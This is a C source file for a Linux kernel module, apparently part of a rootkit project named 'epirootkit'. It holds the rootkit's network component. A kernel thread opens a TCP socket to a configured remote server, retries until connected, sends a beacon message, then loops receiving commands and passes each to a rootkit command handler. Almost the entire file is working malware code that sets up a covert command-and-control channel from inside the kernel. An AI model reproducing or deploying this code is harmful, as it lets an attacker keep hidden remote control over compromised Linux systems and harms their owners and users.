#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/module.h>
#include <linux/socket.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include "epirootkit.h"

struct socket *sock = NULL;

/**
 * @brief Closes the communication by releasing the socket.
 *
 * @return SUCCESS
 */
int close_socket(void)
{
	if (sock) {
		sock_release(sock);
		sock = NULL;
		DBG_MSG("close_socket: socket released\n");
	}
	return SUCCESS;
}

/**
 * @brief Sends a message to the server.
 *
 * This function is responsible for transmitting a given message
 * to a predefined server. The server details and connection
 * mechanism are assumed to be handled elsewhere in the code.
 *
 * @param message A pointer to a null-terminated string containing
 *                the message to be sent. The caller must ensure
 *                that the message is properly formatted and
 *                allocated.
 *
 * @return The return value typically indicates the success or
 *         failure of the operation. Specific return codes and
 *         their meanings should be documented in the implementation.
 */
int send_to_server(char *message, ...){
	struct kvec vec = { 0 };
	struct msghdr msg = { 0 };
	int ret_code = 0;
	va_list args;
	char formatted_message[1024] = { 0 };

	if (!sock) {
		ERR_MSG("send_to_server: socket is NULL\n");
		return -FAILURE;
	}

	// Format the message with additional arguments
	va_start(args, message);
	vsnprintf(formatted_message, sizeof(formatted_message), message, args);
	va_end(args);

	vec.iov_base = formatted_message;
	vec.iov_len = strlen(formatted_message);

	ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
	if (ret_code < 0) {
		ERR_MSG("send_to_server: failed to send message: %d\n", ret_code);
		return -FAILURE;
	}

	return SUCCESS;
}

/**
 * @brief Kernel thread function for managing network communication.
 *
 * @param data Pointer to thread-specific data (unused in this implementation).
 * @return int Returns SUCCESS on successful execution, or FAILURE on error.
 *
 * @note The thread will periodically retry operations such as connecting to the server
 *       or sending messages if they fail.
 */
int network_worker(void *data)
{
	struct sockaddr_in addr = { 0 };
	unsigned char ip_binary[4] = { 0 };
	int ret_code = 0;

	// Convert IP address string into 4-byte binary format
	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
		ERR_MSG("network_worker: invalid IPv4\n");
		return -FAILURE;
	}

	// Create a TCP socket in kernel space
	ret_code = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (ret_code < 0) {
		ERR_MSG("network_worker: socket creation failed: %d\n", ret_code);
		return -FAILURE;
	}

	// Prepare the sockaddr_in structure for the server we want to connect to
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));

	// Attempt to connect to the remote server
	// Retry periodically until the thread is stopped or the connection succeeds
	while (!kthread_should_stop()) {
		ret_code = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
		if (ret_code < 0) {
			ERR_MSG("network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret_code);
			msleep(TIMEOUT_BEFORE_RETRY);
			continue;
		}

		// Connection successful
		break; 
	}

	// Attempt to send the initial message using send_to_server
	int attempts = 0;
	do {
		ret_code = send_to_server(message);
		if (ret_code != SUCCESS) {
			ERR_MSG("network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_MSG_SEND_OR_RECEIVE_ERROR);
			msleep(TIMEOUT_BEFORE_RETRY);
			attempts++;
		}
	} while (ret_code != SUCCESS && attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR);

	// If all attempts to send the message failed, abort
	if (ret_code < 0) {
		ERR_MSG("network_worker: failed to send message after 10 attempts, giving up.\n");
		return -FAILURE;
	}

	DBG_MSG("network_worker: message sent to %s:%d\n", ip, port);

	// Count of empty messages in a row received
	// This is used to determine if the server is still active
	// and to avoid flooding the server with empty messages
	unsigned empty_count = 0;
	// Listen for commands
	// Retry until 'killcom' is received or thread is stopped by unmonting the module
	while (!kthread_should_stop() && !thread_exited) {
		struct kvec recv_vec;
		struct msghdr recv_msg = { 0 };
		char recv_buffer[RCV_CMD_BUFFER_SIZE] = { 0 };

		recv_vec.iov_base = recv_buffer;
		recv_vec.iov_len = sizeof(recv_buffer) - 1;

		// Wait to receive a message from the server
		ret_code = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
		if (ret_code < 0) {
			ERR_MSG("network_worker: error receiving message: %d\n", ret_code);
			msleep(TIMEOUT_BEFORE_RETRY);
			continue;
		}

		// Null-terminate the received message
		recv_buffer[ret_code] = '\0';
		DBG_MSG("network_worker: received: %s", recv_buffer);

		// Check if the received message is empty
		if (recv_buffer[0] == '\0') {
			empty_count++;
			if (empty_count > MAX_MSG_SEND_OR_RECEIVE_ERROR) {
				ERR_MSG("network_worker: too many empty messages, exiting...\n");
				break;
			}
			continue;
		} else {
			empty_count = 0; // Reset the empty message count
		}

		rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
	}

	// Final cleanup before thread exits
	DBG_MSG("network_worker: thread ends.\n");
	thread_exited = true;
	close_socket();

	return SUCCESS;
}